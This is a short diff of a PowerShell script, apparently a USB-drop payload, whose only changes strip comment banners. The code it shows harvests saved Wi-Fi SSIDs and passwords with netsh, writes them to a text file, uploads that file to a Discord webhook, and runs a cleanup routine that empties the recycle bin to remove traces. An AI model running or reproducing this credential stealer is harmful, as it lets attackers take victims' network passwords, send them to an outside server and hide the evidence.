@@ -1,4 +1,3 @@
-﻿############################################################################################################################################################
 
 $wifiProfiles = netsh wlan show profiles | Select-String "utilisateur"
 foreach ($wifiProfile in $wifiProfiles) {
@@ -10,7 +9,7 @@ foreach ($wifiProfile in $wifiProfiles) {
     "SSID : " + $wifiName + " | " + "Password : "+$wifiPass >> wifi-pass.txt
 }
 
-############################################################################################################################################################
+
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -38,7 +37,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "wifi-pass.txt"}
 
  
 
-############################################################################################################################################################
+
 
 function Clean-Exfil { 
 
@@ -56,7 +55,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 
-############################################################################################################################################################
+
 
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
